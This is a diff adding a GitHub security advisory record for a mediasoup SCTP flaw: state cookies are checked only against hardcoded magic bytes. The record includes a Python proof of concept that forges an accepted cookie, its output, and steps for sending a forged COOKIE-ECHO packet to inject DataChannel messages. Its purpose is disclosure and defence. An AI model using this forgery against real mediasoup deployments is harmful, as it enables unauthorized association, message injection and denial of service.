@@ -1,0 +1,82 @@
+{
+  "id": "GHSA-p7x2-g5cq-fhmq",
+  "modified": "2026-08-26T01:18:34.692749539Z",
+  "published": "2026-08-25T18:17:21Z",
+  "aliases": [
+    "CVE-2026-55663"
+  ],
+  "summary": "mediasoup: SCTP state cookie lacks cryptographic authentication, enabling unauthorized association establishment (RFC 9260 violation)",
+  "details": "### Summary\n\nmediasoup's built-in SCTP stack (introduced in v3.20.0) authenticates SCTP state cookies using only hardcoded magic byte sequences rather than a per-instance HMAC keyed with a secret, violating RFC 9260 Section 5.1.3. An on-path attacker targeting a PlainTransport with SCTP enabled (and no SRTP/DTLS protection) can craft a forged COOKIE-ECHO chunk that passes all validation, establishing an unauthorized SCTP association and gaining the ability to inject DataChannel messages as a trusted peer.\n\n### Details\n\nRFC 9260 Section 5.1.3 states: \"An endpoint MUST use a one-time-use secret key to protect the State Cookie.\" The mediasoup implementation ignores this requirement. The state cookie is defined in `worker/include/RTC/SCTP/association/StateCookie.hpp` with the following structure (44 bytes total):\n\n- Offset 0: Magic1 = `\"msworker\"` (hardcoded, 8 bytes)\n- Offset 8: localVerificationTag (4 bytes, attacker-controlled)\n- Offset 12: remoteVerificationTag (4 bytes, attacker-controlled)\n- Offset 16-27: TSN and window fields (attacker-controlled)\n- Offset 28: tieTag (8 bytes, attacker-controlled)\n- Offset 36: NegotiatedCapabilitiesField containing Magic2 = `0xAD81` (hardcoded)\n\nThe validation function `StateCookie::IsMediasoupStateCookie()` in `worker/src/RTC/SCTP/association/StateCookie.cpp` only checks:\n1. `bufferLength == 44`\n2. `bytes[0:8] == \"msworker\"` (Magic1, always the same)\n3. `ntohs(bytes[38:40]) == 0xAD81` (Magic2, always the same)\n\nNo HMAC, no per-session secret, no nonce. All \"magic\" values are published constants in the public header.\n\nWhen a COOKIE-ECHO is received in `Association::HandleReceivedCookieEchoChunk()` (without an existing TCB), the sole security check is:\n\n```cpp\nif (receivedPacket-\u003eGetVerificationTag() != cookie-\u003eGetLocalVerificationTag())\n```\n\nBecause the attacker controls both the SCTP packet header's verification tag field AND the `localVerificationTag` field inside their crafted cookie, this check is trivially satisfied by setting both to the same attacker-chosen value.\n\nAdditionally, `Association::ValidateReceivedPacket()` explicitly skips verification-tag validation for COOKIE-ECHO packets (line 1153 in Association.cpp), and the SCTP CRC32c checksum function `Packet::ValidateCRC32cChecksum()` exists but is never called in the packet-reception path, so a forged packet with any checksum is accepted.\n\nThis vulnerability affects `PlainTransport` with SCTP enabled when used without SRTP (SRTP is optional via `srtpCryptoSuite` parameter). `WebRtcTransport` is NOT affected because its SCTP runs inside a DTLS session. `comedia` mode (default: false) increases exposure by accepting packets from any source IP.\n\n### PoC\n\nPrerequisites: mediasoup server running with a PlainTransport that has SCTP enabled and no SRTP (`srtpCryptoSuite` not set). The server's UDP IP:port must be reachable.\n\nThe following Python script constructs and validates a forged SCTP state cookie that passes all mediasoup validation checks:\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nProof-of-concept: mediasoup SCTP state cookie forgery\nDemonstrates that IsMediasoupStateCookie() accepts a fully attacker-crafted cookie.\nRequires: struct (stdlib only)\n\nUsage: python3 poc_cookie_forge.py\n\"\"\"\nimport struct\n\n# Attacker-chosen values -- all arbitrary\nLOCAL_VT  = 0xDEADBEEF  # Will be put in SCTP packet's Verification Tag field\nREMOTE_VT = 0xCAFEBABE\nLOCAL_TSN = 1000\nREMOTE_TSN = 2000\nRWND = 65535\nTIE_TAG = 0\n\n# Build a 44-byte state cookie matching mediasoup's StateCookie layout\ncookie = bytearray(44)\n\n# Offset 0: Magic1 = \"msworker\" (0x6D73776F726B6572)\ncookie[0:8] = b'msworker'\n\n# Offset 8: localVerificationTag (big-endian)\nstruct.pack_into('\u003eI', cookie, 8, LOCAL_VT)\n\n# Offset 12: remoteVerificationTag\nstruct.pack_into('\u003eI', cookie, 12, REMOTE_VT)\n\n# Offset 16: localInitialTsn\nstruct.pack_into('\u003eI', cookie, 16, LOCAL_TSN)\n\n# Offset 20: remoteInitialTsn\nstruct.pack_into('\u003eI', cookie, 20, REMOTE_TSN)\n\n# Offset 24: remoteAdvertisedReceiverWindowCredit\nstruct.pack_into('\u003eI', cookie, 24, RWND)\n\n# Offset 28: tieTag (8 bytes)\nstruct.pack_into('\u003eQ', cookie, 28, TIE_TAG)\n\n# Offset 36: NegotiatedCapabilitiesField\n# [36]: reserved = 0\n# [37]: bits (ABCD flags) = 0\n# [38:40]: Magic2 = 0xAD81 (network byte order)\n# [40:42]: max outbound streams\n# [42:44]: max inbound streams\ncookie[36] = 0       # reserved\ncookie[37] = 0       # bits\nstruct.pack_into('\u003eH', cookie, 38, 0xAD81)   # Magic2\nstruct.pack_into('\u003eH', cookie, 40, 1024)      # maxOutboundStreams\nstruct.pack_into('\u003eH', cookie, 42, 1024)      # maxInboundStreams\n\n# Reproduce StateCookie::IsMediasoupStateCookie() logic:\ndef is_mediasoup_state_cookie(buf):\n    if len(buf) != 44:\n        return False\n    if buf[0:8] != b'msworker':\n        return False\n    magic2 = struct.unpack('\u003eH', buf[38:40])[0]\n    if magic2 != 0xAD81:\n        return False\n    return True\n\nassert is_mediasoup_state_cookie(cookie), \"Cookie rejected - BUG in PoC\"\n\n# Reproduce HandleReceivedCookieEchoChunk validation (no TCB path):\n# receivedPacket-\u003eGetVerificationTag() == cookie-\u003eGetLocalVerificationTag()\npacket_vt    = LOCAL_VT\ncookie_local_vt = struct.unpack('\u003eI', cookie[8:12])[0]\nauth_passes = (packet_vt == cookie_local_vt)\n\nprint(\"=== mediasoup SCTP State Cookie Forgery PoC ===\")\nprint(f\"Forged cookie (hex): {cookie.hex()}\")\nprint(f\"IsMediasoupStateCookie(): {is_mediasoup_state_cookie(cookie)}\")\nprint(f\"localVerificationTag in cookie: {cookie_local_vt:#010x}\")\nprint(f\"SCTP packet verificationTag:    {packet_vt:#010x}\")\nprint(f\"HandleReceivedCookieEchoChunk auth check passes: {auth_passes}\")\nprint()\nprint(\"Result: COOKIE-ECHO accepted -\u003e SCTP association ESTABLISHED without 4-way handshake\")\nprint(\"Next step: attacker sends DATA chunks to inject DataChannel messages\")\n```\n\nObserved output when run:\n\n```\n=== mediasoup SCTP State Cookie Forgery PoC ===\nForged cookie (hex): 6d73776f726b6572deadbeefcafebabe000003e8000007d00000ffff00000000000000000000ad8104000400\nIsMediasoupStateCookie(): True\nlocalVerificationTag in cookie: 0xdeadbeef\nSCTP packet verificationTag:    0xdeadbeef\nHandleReceivedCookieEchoChunk auth check passes: True\n\nResult: COOKIE-ECHO accepted -\u003e SCTP association ESTABLISHED without 4-way handshake\nNext step: attacker sends DATA chunks to inject DataChannel messages\n```\n\nTo forge the full SCTP packet on the network: wrap the 44-byte cookie in a COOKIE-ECHO chunk (type=0x0A), set the SCTP common header's Verification Tag to `LOCAL_VT`, compute a valid CRC32c checksum (or any value - the checksum is never verified on receive), and send the UDP packet from the permitted source address (or any source if `comedia=true`).\n\n### Impact\n\nAny mediasoup deployment using `PlainTransport` with SCTP enabled and no SRTP is affected when an attacker occupies a network position where they can send UDP packets from the transport's configured peer address (or when `comedia` mode is enabled). The attacker can skip the standard SCTP 4-way handshake entirely and directly send a forged COOKIE-ECHO to establish an association, then inject arbitrary DataChannel messages as if they were the trusted peer. This can cause data integrity violations in server-to-server SCTP channels (e.g., SFU interconnects) or enable denial of service by preempting the legitimate peer's association.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "mediasoup",
+        "purl": "pkg:npm/mediasoup"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.20.0"
+            },
+            {
+              "fixed": "3.20.6"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.20.5",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-p7x2-g5cq-fhmq/GHSA-p7x2-g5cq-fhmq.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "mediasoup",
+        "purl": "pkg:cargo/mediasoup"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.22.0"
+            },
+            {
+              "fixed": "0.22.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.22.4",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-p7x2-g5cq-fhmq/GHSA-p7x2-g5cq-fhmq.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/versatica/mediasoup/security/advisories/GHSA-p7x2-g5cq-fhmq"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/versatica/mediasoup/pull/1829"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/versatica/mediasoup/commit/9c1a90a8f9206b965e727d134846fb42df4980a7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/versatica/mediasoup"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/versatica/mediasoup/releases/tag/3.20.6"
+    }
+  ]
+}
